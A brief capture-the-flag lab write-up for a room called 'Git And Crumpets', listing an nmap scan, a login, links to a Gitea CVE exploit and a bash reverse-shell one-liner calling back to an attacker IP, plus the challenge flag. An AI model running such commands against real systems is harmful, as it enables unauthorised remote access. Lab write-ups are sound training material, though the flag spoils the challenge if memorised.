# Git And Crumpets

* IP = 10.10.230.151

## Enumeration and Scanning:

### Scan for Open Ports:

* Nmap to scan and discover open ports on the server:`nmap -sC -sV -vv $IP`
* Nmap Scan Results:
```bash
PORT     STATE  SERVICE    REASON       VERSION
22/tcp   open   ssh        syn-ack      OpenSSH 8.0 (protocol 2.0)
80/tcp   open   http       syn-ack      nginx
|_http-favicon: Unknown favicon MD5: 6A7F7C90FDB7FE26DB324F5BA6859594
| http-title: Hello, World
|_Requested resource was http://10.10.230.151/index.html
|_http-trane-info: Problem with XML parsing of /evox/about
9090/tcp closed zeus-admin conn-refused

```
`curl -v http://IP/`

https://www.youtube.com/watch?v=dQw4w9WgXcQ

`10.10.230.151  git.git-and-crumpets.thm`

`scones:Password`

https://nvd.nist.gov/vuln/detail/CVE-2020-14144
https://github.com/PandatiX/CVE-2021-28378
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```bash
bash -i >& /dev/tcp/10.4.50.128/7777 0>&1
```
`find / -xdev -user git 2> /dev/null`



**Ans-thm{fd7ab9ffd409064f257cd70cf3d6aa16**
